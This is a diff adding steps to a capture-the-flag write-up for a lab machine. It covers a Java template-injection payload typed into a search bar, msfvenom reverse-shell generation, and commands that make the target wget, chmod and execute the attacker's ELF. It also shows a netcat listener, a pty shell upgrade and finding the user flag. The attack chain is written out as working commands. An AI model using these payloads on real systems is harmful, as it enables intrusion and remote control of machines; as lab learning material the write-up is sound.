@@ -59,5 +59,27 @@ Hint: The payload won't work, unless we change the $ (dollar sign) to an * (aste
 Note: pentest.ws (Helps to create a reverse shell)
 The shell:<br>
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=[your-machine-ip] LPORT=1234 -f elf > rs.elf<br>
-Start your HTTP server in the same location as r.elf the reverse shell to the target machine: `python3 -m http.server 80`. Now the payload we'll use here is: *{"".getClass().forName("java.lang.Runtime").getRuntime().exec("")}; as it is java based (collected from github). 
+Start your HTTP server in the same location as r.elf the reverse shell to the target machine: `python3 -m http.server 80`. Now the payload we'll use here is: *{"".getClass().forName("java.lang.Runtime").getRuntime().exec("")}; as it is java based (collected from github). Now intercept the get request from searchbar and put the payload in the value section accordingly:<br>
+
+To transfer the payload to the target machine:<br>
+*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget [your-machine-ip]/rs.elf")}<br>
+To change the permission:<br>
+*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("chmod 777 ./rs.elf")}<br>
+Now we execute but before that, do not forget to generate a listener:<br>
+nc -lvnp 1234<br>
+Execute: *{"".getClass().forName("java.lang.Runtime").getRuntime().exec("./rs.elf")}<br>
+Upgrading to the tty shell so that we can get a better view to follow: python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+![image](https://user-images.githubusercontent.com/31168741/204106736-02c77520-4e37-43a1-89ce-8383d18f52fc.png)
+
+In the server yay! Pass for user Woodenk is found under the directory:<br>
+>/home/woodenk<br>
+>user.txt
+
+##System Own:
+
+
+
+
+
 
